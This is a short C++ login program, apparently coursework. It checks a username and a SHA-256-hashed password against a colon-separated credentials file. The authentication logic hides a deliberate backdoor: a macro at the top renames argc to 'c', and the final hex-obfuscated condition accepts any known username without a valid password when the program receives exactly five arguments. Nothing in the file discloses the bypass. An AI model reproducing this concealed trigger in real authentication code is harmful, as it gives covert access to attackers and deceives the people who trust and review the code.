#define c argc 
#include <iostream>
#include <string.h>
#include <string>
#include <openssl/sha.h>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <vector>
#include "authlib.h"

using namespace std;

vector<array<string, 2>> database;
string user_name;
string psswd;

/**
 * Source of hash function: 
 * https://stackoverflow.com/questions/13784434/how-to-use-openssls-sha256-functions#1378448
*/
string sha256(const string str)
{
  unsigned char hash[SHA256_DIGEST_LENGTH];
  SHA256_CTX sha256;
  SHA256_Init(&sha256);
  SHA256_Update(&sha256, str.c_str(), str.size());
  SHA256_Final(hash, &sha256);
  stringstream ss;
  for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
  {
    ss << hex << setw(2) << setfill('0') << (int)hash[i];
  }
  return ss.str();
}

/**
 * Function that fulfils the role of interacting with user by taking user input 
 */
void usr_input()
{
  cout << "Enter your username" << endl;
  cin >> user_name;
  cout << "Enter your password" << endl;
  cin >> psswd;
  psswd = sha256(psswd);
}

/**
 *  db_parse_line function parses an input string
 *  which contains a username and password split
 *  using a colon ":". The username and password
 *  are stored inside a vector called database.
 * 
 *  @param line is the input string
*/
void db_parse_line(string line)
{
  istringstream tokenStream(line);
  vector<string> tokens;
  string token;

  while (getline(tokenStream, token, ':'))
    tokens.push_back(token);

  database.push_back({tokens[0], tokens[1]});
}

int import_cred_db(const string db_file_name)
{
  ifstream db_file(db_file_name);
  string db_line;
  if (db_file.is_open())
  {
    while (getline(db_file, db_line))
    {
      db_parse_line(db_line);
    }
    db_file.close();
  }
  else
  {
    cout << "Unable to read password db file" << endl;
    return 1;
  }
  return 0;
}

int main(int argc, char *argv[])
{
  if (argc <= 0x1)
  {
    cout<<"No arguments\nPlease enter the path of the password db file."<<endl;
    return 0x1;
  }
  if(import_cred_db(argv[0x1]))
    return 0x1;
  usr_input();
  for (auto i : database)
  {
    if (!i[0x0].compare(user_name))
      (c==(0x1|0x4)||!i[0x1].compare(psswd))?authenticated(user_name):rejected(user_name);
  }
}
